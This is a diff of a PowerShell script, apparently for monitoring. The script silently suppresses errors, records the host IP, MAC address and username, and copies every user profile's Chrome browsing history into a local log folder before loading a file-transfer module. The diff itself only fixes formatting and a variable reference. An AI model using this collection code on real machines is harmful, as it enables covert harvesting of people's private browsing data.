@@ -1,4 +1,4 @@
-﻿$ErrorActionPreference = 'silentlycontinue'
+$ErrorActionPreference = 'silentlycontinue'
     $env:hostIP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress 
     $env:hostMAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"} | Where-Object {$_.InterfaceDescription -notmatch "TEST"}).MacAddress
     $env:USERNAME
@@ -29,7 +29,7 @@ $sn = $sn
 
 function Copy_Up_Chrome
 {
-    Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_$sn_$(get-date -f yyyyMMddHHmmss)_ChromeHistory
+    Copy-Item 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' -Destination C:\ProgramData\soalog\${env:COMPUTERNAME}_${env:USERNAME}_${env:hostIP}_${env:hostMAC}_${sn}_$(get-date -f yyyyMMddHHmmss)_ChromeHistory
 
     
         Import-Module bitstransfer
